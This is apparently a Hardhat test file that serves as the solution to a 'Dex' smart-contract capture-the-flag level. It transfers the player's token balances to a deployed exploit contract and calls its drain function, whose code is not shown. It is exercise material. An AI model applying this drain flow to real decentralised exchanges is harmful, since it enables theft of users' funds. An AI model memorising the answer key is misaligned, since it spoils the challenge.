import { ethers } from "hardhat";
import { expectLevelSolved } from "../utils";
import { deploymentConfirmation, txConfirmation } from "./utils";

describe("Dex Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "22", 
    solutionFn: async ({ challenge, accounts: [ eoa ] }) => {
      const token1 = await ethers.getContractAt("ERC20", await challenge.token1())
      const token2 = await ethers.getContractAt("ERC20", await challenge.token2())
      const exploit = await deploymentConfirmation("DexSolution", challenge.address);
      await txConfirmation(token1.transfer(exploit.address, await token1.balanceOf(eoa.address)))
      await txConfirmation(token2.transfer(exploit.address, await token2.balanceOf(eoa.address)))
      await txConfirmation(exploit.drain());
    }
  }));
});
